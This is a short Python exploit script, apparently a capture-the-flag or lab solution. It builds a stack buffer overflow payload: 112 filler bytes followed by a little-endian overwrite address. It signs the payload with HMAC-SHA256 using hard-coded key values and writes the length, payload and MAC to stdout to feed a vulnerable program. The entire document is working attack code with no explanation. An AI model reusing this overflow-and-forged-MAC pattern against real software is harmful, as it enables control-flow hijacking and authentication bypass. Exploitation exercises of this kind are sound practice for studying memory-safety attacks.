import hmac 
import sys
from hashlib import sha256

attk = b"a" * 112 + 0x80496ce.to_bytes(4, "little")

key1 = 0x67d6e5a1
key2 = 0x8307f317
key3 = 0x2722b2e9
key4 = 0x89999d6b
key5 = 0xeab0d68c
key6 = 0x79b403cb
key7 = 0x2e3be30f
key8 = 0x5588030b

big_ass_key = key1.to_bytes(4, "little") + key2.to_bytes(4, "little") + key3.to_bytes(4, "little") + key4.to_bytes(4, "little") + key5.to_bytes(4, "little") + key6.to_bytes(4, "little") + key7.to_bytes(4, "little") + key8.to_bytes(4, "little")

hash = hmac.new(key=big_ass_key, msg=attk, digestmod=sha256).digest()

sys.stdout.buffer.write(len(attk).to_bytes(4, "little"))
sys.stdout.buffer.write(attk)
sys.stdout.buffer.write(hash)